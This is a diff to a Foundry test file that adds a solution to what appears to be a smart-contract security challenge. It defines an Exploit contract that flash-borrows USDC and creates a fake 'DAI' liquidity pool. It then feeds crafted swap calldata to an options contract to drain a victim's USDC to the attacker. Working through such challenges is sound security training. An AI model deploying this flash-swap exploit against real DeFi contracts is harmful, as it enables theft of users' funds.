@@ -143,7 +143,10 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
-
+        //address attacker, address _optionsContract, address _factory, address _router, address _usdc
+        Exploit exploit = new Exploit(address(attacker),address(optionsContract), address(uniFactory),address(uniRouter),address(usdc), address(usdcDaiPair));
+        //usdc.transfer(address(exploit),usdc.balanceOf(address(attacker)));
+        exploit.pwn(address(adminUser));
         vm.stopPrank();
         validation();
     }
@@ -156,4 +159,67 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit {
+
+    address owner;
+    Token fakeToken;
+    Token usdc;
+    IUniswapV2Factory uniFactory;
+    IUniswapV2Router02 uniRouter;
+    IUniswapV2Pair usdcFakeTokenPair;
+    IUniswapV2Pair usdcDaiPair;
+    CallOptions optionsContract;
+    constructor(address attacker, address _optionsContract, address _factory, address _router, address _usdc, address _usdcDaiPair){
+        owner = attacker;
+        optionsContract = CallOptions(_optionsContract);
+        fakeToken = new Token('DAI','DAI');
+        fakeToken.mint(address(this),1_000_000e18);
+        uniRouter = IUniswapV2Router02(_router);
+        uniFactory = IUniswapV2Factory(_factory);
+        usdcDaiPair = IUniswapV2Pair(_usdcDaiPair);
+        usdc = Token(_usdc);
+        usdc.approve(address(uniRouter),type(uint).max);
+        fakeToken.approve(address(uniRouter),type(uint).max);
+    }
+
+    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
+        console.log("balance usdc of exploit : ",usdc.balanceOf(address(this)));
+        uniRouter.addLiquidity( // creates USDC-fakeToken pair
+            address(usdc),address(fakeToken),
+            usdc.balanceOf(address(this)),fakeToken.balanceOf(address(this)),
+            0,0,
+            address(this),block.timestamp
+        );
+        usdcFakeTokenPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(fakeToken)));
+
+        address to = abi.decode(data, (address));
+        bytes32 optionId = optionsContract.getLatestOptionId();
+        uint256 interestAmount = usdc.balanceOf(address(to));
+
+        bytes memory _calldata = abi.encode(optionId,to,interestAmount);
+        usdcFakeTokenPair.swap(2_100e18,0,address(optionsContract), _calldata);
+
+        console.log("balance usdc of target : ",usdc.balanceOf(address(owner)));
+        console.log("balance usdc of usdcFakeTokenPair : ",usdc.balanceOf(address(usdcFakeTokenPair)));
+        usdcFakeTokenPair.approve(address(uniRouter),type(uint).max);
+        uniRouter.removeLiquidity(
+            address(usdc),address(fakeToken),
+            usdcFakeTokenPair.balanceOf(address(this))-1,
+            0,0,
+            address(this),block.timestamp
+        );
+        
+        console.log("balance usdc of exploit : ",usdc.balanceOf(address(this)));
+        console.log("amount to repay : ",(amount0Out * 103 /100)+1);//yeah the premium is a bit to high
+
+        usdc.transfer(address(usdcDaiPair), (amount0Out * 103 /100)+1);
+        usdc.transfer(owner, usdc.balanceOf(address(this)));
+        console.log("balance usdc of attacker : ",usdc.balanceOf(address(owner)));
+    }
+    function pwn(address target) external{
+        bytes memory _calldata = abi.encode(target);
+        usdcDaiPair.swap(3_000e18,0,address(this), _calldata);
+    }
 }
